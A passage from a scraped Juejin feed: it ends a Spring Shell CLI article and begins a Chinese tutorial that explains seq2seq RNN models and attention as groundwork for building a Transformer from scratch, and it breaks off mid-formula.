<li>Tab 补全：自动补全服务名和参数</li>
<li>命令历史：保存执行历史，支持上下键浏览</li>
<li>颜色输出：不同类型信息使用不同颜色显示</li>
</ul>
<h4 data-id="heading-21">2. 结果格式化</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> String <span class="hljs-title function_">formatResponse</span><span class="hljs-params">(String data)</span> {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">json</span> <span class="hljs-operator">=</span> objectMapper.readValue(data, Object.class);
        <span class="hljs-keyword">return</span> objectMapper.writerWithDefaultPrettyPrinter()
                          .writeValueAsString(json);
    } <span class="hljs-keyword">catch</span> (Exception e) {
        <span class="hljs-keyword">return</span> data;
    }
}
</code></pre>
<h4 data-id="heading-22">3. 脚本模式</h4>
<p>支持从文件执行命令序列：</p>
<pre><code class="hljs language-shell" lang="shell">exec script --args commands.txt
</code></pre>
<h2 data-id="heading-23">七、总结</h2>
<p>本文介绍的"通用命令+动态分发"方案，通过Spring Boot + Spring Shell构建，使用单一 exec 命令实现多服务动态调用，大幅简化了CLI系统的维护复杂度。</p>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/yuboon</span><span class="hljs-regexp">/java-examples/tree</span><span class="hljs-regexp">/master/springboot</span>-cli
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[解剖注意力：从零构建Transformer的终极指南]]></title>    <link>https://juejin.cn/post/7584013833993224226</link>    <guid>https://juejin.cn/post/7584013833993224226</guid>    <pubDate>2025-12-16T06:11:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584013833993224226" data-draft-id="7583992239103049780" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="解剖注意力：从零构建Transformer的终极指南"/> <meta itemprop="keywords" content="深度学习"/> <meta itemprop="datePublished" content="2025-12-16T06:11:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Narrastory"/> <meta itemprop="url" content="https://juejin.cn/user/4355593566170010"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            解剖注意力：从零构建Transformer的终极指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4355593566170010/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Narrastory
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:11:58.000Z" title="Tue Dec 16 2025 06:11:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="arduino-light">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff}.hljs-subst,.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#434f54}.hljs-attribute,.hljs-doctag,.hljs-keyword,.hljs-name,.hljs-selector-tag{color:#00979d}.hljs-addition,.hljs-built_in,.hljs-bullet,.hljs-code,.hljs-literal{color:#d35400}.hljs-link,.hljs-regexp,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-symbol,.hljs-template-variable,.hljs-variable{color:#00979d}.hljs-deletion,.hljs-quote,.hljs-selector-class,.hljs-selector-id,.hljs-string,.hljs-template-tag,.hljs-type{color:#005c5f}.hljs-section,.hljs-title{color:#800;font-weight:700}.hljs-comment{color:rgba(149,165,166,.8)}.hljs-meta-keyword{color:#728e00}.hljs-meta{color:#434f54}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-function{color:#728e00}.hljs-number{color:#8a7b52}</style><h2 data-id="heading-0">解剖注意力：从零构建Transformer的终极指南</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c68de8a68e4147d0ba2f162dc642c0bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Smr%2FNYE8Wy6F%2FIaIO6toHKd9pSM%3D" alt="GitHub" loading="lazy"/></p>
<blockquote>
<p>Author: Ming</p>
</blockquote>
<hr/>
<div align="center">
  <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/37acc0c1e2bb4a518eccc6055f96eaa6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=lqcla3Fz3E0t6OwlOuXzNqSzx8g%3D" alt="AI Generated Art" width="90%" loading="lazy"/>
</div>
<p>相信不用我过多介绍，你已经对 Transformer 如雷贯耳，它是当今大语言模型的核心基石，可以说没有Transformer就没有今天的人工智能浪潮。</p>
<p>给还不了解Transformer的读者简单介绍一下，Transformer是一种深度学习<strong>架构</strong>（完全不同于以往的循环神经网络），最初于2017年由Google团队在论文《Attention Is All You Need》中提出，一开始它被提出来是为了解决机器翻译问题，并一举取得突破，在翻译任务中取得的非常大的成功。然而，人们很快发现，Transformer 的潜力远超预期——它不仅擅长翻译，在序列和语言任务中游刃有余，还能轻松迁移到其他任务中，甚至形成“碾压”级别的优势。</p>
<p>因此，在这篇文章中，我们将深入 Transformer 的每一层结构，从理论到代码，从矩阵乘法开始，一步步拆解它的设计精髓。我们不仅会探讨它的组成与原理，还会教你如何亲手从零实现一个完整的 Transformer 模型。</p>
<p>相信我，当你在看完了本篇文章后，你完全可以自己“手搓”一个Transformer出来，更能理解其设计哲学，并灵活运用到你自己的实际项目中。当然，由于 Transformer 属于相对前沿且有一定深度的内容，为了更顺畅地阅读与实践，建议你具备以下基础：机器学习与深度学习的基本概念、线性代数基础知识，基本自然语言处理</p>
<p><em>本文中展示的神经网络架构图，除特殊注明外，均为作者原创绘制。读者可自由分享使用，但使用时请注明出处。</em></p>
<hr/>
<p>既然要深入理解Transformer，我们不妨先回到它诞生的起点：机器翻译问题。在Transformer尚未出现的年代，机器翻译的主流架构是什么？熟悉深度学习历史的读者一定会想到——基于循环神经网络（RNN）的Seq2Seq模型，也就是经典的编码器-解码器架构。让我们以英译中任务为例，一步步还原它的工作流程。</p>
<p>假设我们要翻译“How are you”这句话。首先，输入的英文单词经过Embedding层转化为词向量序列。这些向量按时间顺序依次输入循环神经网络（RNN）中，经过层层传递与更新，最终在最后一个时间步输出一个隐藏状态（hidden state）。这个状态被视为整个句子的语义浓缩，承载着“How are you”的全部信息。这个过程，就是<strong>编码器（Encoder）</strong> 的核心。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12ef7a3c3748475ba7477c9d5413b6dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Rcd3%2BkWdSkV2Ufx5khyTwf8ptwM%3D" alt="c1.jpg" width="100%" loading="lazy"/></p>
<p>需要注意的是，上图中简化为一个 <code>RNN Cell</code> 的模块，在实际任务中通常是多层、多单元的复杂结构——可以是LSTM，也可以是GRU。像机器翻译这样复杂度高、序列长的任务，单一RNN单元难以胜任，实际使用的是多层堆叠的RNN网络。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c01697f3d5114412abc4c655ea0fca38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=eEnd26nhfJhw3k6uOOdjS7usX0M%3D" alt="c3.jpg" width="100%" loading="lazy"/></p>
<p>得到这个全局隐藏状态后，<strong>解码器（Decoder）</strong> 开始工作，将其逐步转化为目标语言（中文）。如上图所示，解码器在每个时间步不仅接收上一个时间步的输出，还会将编码器输出的隐藏状态与当前输入进行合并（图中圆圈内一竖表示拼接操作，类似PyTorch中的 <code>torch.cat()</code> 或 NumPy 中的 <code>np.concatenate()</code>）。</p>
<p>这种设计在当年被视为一种重要改进——它让解码过程始终“携带”源句子的整体信息，理论上可以在生成长序列时缓解信息衰减问题。尤其在长句子翻译中，这样做有助于模型记住开头的语境，避免翻译到句末时遗忘开头的内容。</p>
<p>下图是此网络架构的训练流程，具体的细节就不过多介绍了。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb2a1170b4e54d06a7f45c544a3f6ee6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=F75j9cbeqZRGcTczvl0vgTSgNrQ%3D" alt="c2.jpg" width="100%" loading="lazy"/></p>
<p>看到这里，你可能会想，真的有必要把隐藏状态和当前输入做拼接吗？例如在生成“你好”时，我们强行注入了“How are you”的全部语义。这虽然带来了全局信息，却也不可避免地引入了<strong>噪声与冗余</strong>——毕竟在翻译当前词时，我们可能并不需要整个句子的所有信息，而只是其中某几个相关的片段。</p>
<p>如果你也产生了这样的疑问，那么恭喜，你已经触及了<strong>注意力机制</strong>诞生的关键动机。没错，注意力并不是 Transformer 的专利，早在Transformer出现之前，它就已经在 seq2seq 模型中用于缓解上述问题了。它的核心思想很直观：<strong>让模型学会在解码每个词时，自主选择编码器输出的哪些部分更值得关注</strong>。</p>
<p>那么具体是如何实现的呢？下面就是一种结合了<strong>双向 RNN 与简易注意力</strong>的编码器-解码器架构：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/00e419faab7944e6b349a951d186a46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=SCu4PwUiI6NFRhIUSmQ2rbpnVcA%3D" alt="c4.jpg" width="100%" loading="lazy"/></p>
<p>此时，编码器不再输出一个代表整个句子的单一隐藏状态，而是让输入序列中的每个词经过双向 RNN 后，都对应一个独立的语义向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。例如，“How” 对应<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">O_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> ，“are” 对应<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">O_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，依此类推。解码时，我们不再将整个句子信息一股脑儿注入，而是<strong>动态计算一个上下文向量</strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">c_{t}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>，它由所有<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>加权求和得到：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>c</mi><mi>t</mi></msub><mo>=</mo><munder><mo>∑</mo><mi>j</mi></munder><msub><mi>q</mi><mrow><mo stretchy="false">(</mo><mi>t</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></msub><msub><mi>O</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">c_{t} = \sum_{j}q_{(t,j)}O_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" 